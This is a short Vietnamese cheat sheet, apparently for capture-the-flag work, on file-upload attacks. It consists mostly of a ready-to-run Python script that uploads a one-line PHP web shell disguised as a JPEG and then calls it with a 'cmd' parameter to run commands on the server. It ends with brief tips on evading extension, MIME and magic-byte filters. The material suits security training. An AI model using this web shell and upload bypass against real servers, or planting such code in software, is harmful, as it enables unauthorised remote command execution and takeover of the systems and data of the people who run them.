# File Upload

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# Upload webshell/polyglot tùy challenge
content = b"<?php system($_GET['cmd']); ?>"
files = {"file": ("shell.php.jpg", content, "image/jpeg")}
data = {"submit": "1"}
r = s.post(f"{base}/upload", files=files, data=data, timeout=10)
print(r.status_code, r.text[:300])

# Thử truy cập file đã upload (đường dẫn tùy app)
r = s.get(f"{base}/uploads/shell.php.jpg", params={"cmd": "id"}, timeout=5)
print(r.status_code, r.text[:300])
```

## Lưu ý nhanh
- Kiểm tra filter ở filename, extension, MIME, magic bytes, path lưu.
- `files` tuple là `(filename, content, content_type)`.
- Nếu server đổi tên file, đọc response/HTML để lấy đường dẫn thật.